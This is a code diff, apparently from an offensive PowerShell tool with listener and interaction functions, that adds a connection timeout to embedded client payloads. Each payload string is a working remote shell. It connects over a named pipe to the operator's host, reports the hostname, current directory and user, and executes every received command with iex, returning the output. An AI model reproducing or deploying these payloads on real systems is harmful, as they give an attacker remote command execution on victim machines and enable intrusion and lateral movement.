@@ -1013,9 +1013,9 @@ function Start-Listener {
 	
 	$ComputerName = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
 
-	$ClientScript="`$p=New-Object System.IO.Pipes.NamedPipeClientStream('$ComputerName','$PipeName','InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect();`$w.WriteLine(""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq 'exit'){break};try{`$result=iex ""`$c 2>&1 | Out-String"";`$result-split '`n'|%{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split '`r?`n'|%{`$w.WriteLine(`$_)}};`$w.WriteLine('#END#');`$w.Flush()}`$p.Close();`$p.Dispose()"
+	$ClientScript="`$p=New-Object System.IO.Pipes.NamedPipeClientStream('$ComputerName','$PipeName','InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(600000);`$w.WriteLine(""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq 'exit'){break};try{`$result=iex ""`$c 2>&1 | Out-String"";`$result-split '`n'|%{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split '`r?`n'|%{`$w.WriteLine(`$_)}};`$w.WriteLine('#END#');`$w.Flush()}`$p.Close();`$p.Dispose()"
 	
-	$RawClientScript = "`$p=New-Object System.IO.Pipes.NamedPipeClientStream(""$ComputerName"",""$PipeName"",'InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect();`$w.WriteLine(""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq ""exit""){break};try{`$result=iex ""`$c 2>&1 | Out-String"";`$result-split ""`u{000A}""|ForEach-Object{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split ""`u{000D}`u{000A}""|ForEach-Object{`$w.WriteLine(`$_)}};`$w.WriteLine(""#END#"");`$w.Flush()}`$p.Close();`$p.Dispose()"
+	$RawClientScript = "`$p=New-Object System.IO.Pipes.NamedPipeClientStream(""$ComputerName"",""$PipeName"",'InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(600000);`$w.WriteLine(""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq ""exit""){break};try{`$result=iex ""`$c 2>&1 | Out-String"";`$result-split ""`u{000A}""|ForEach-Object{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split ""`u{000D}`u{000A}""|ForEach-Object{`$w.WriteLine(`$_)}};`$w.WriteLine(""#END#"");`$w.Flush()}`$p.Close();`$p.Dispose()"
 	
 	$PwshRawClientScript = $RawClientScript
 	
@@ -3652,7 +3652,7 @@ function Choose-And-Interact {
 `$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", "$PipeName", 'InOut')
 `$sr = New-Object System.IO.StreamReader(`$pipeClient)
 `$sw = New-Object System.IO.StreamWriter(`$pipeClient)
-`$pipeClient.Connect()
+`$pipeClient.Connect(600000)
 `$sw.WriteLine("`$env:COMPUTERNAME,`$(Get-Location)")
 `$sw.Flush()
 while (`$true) {
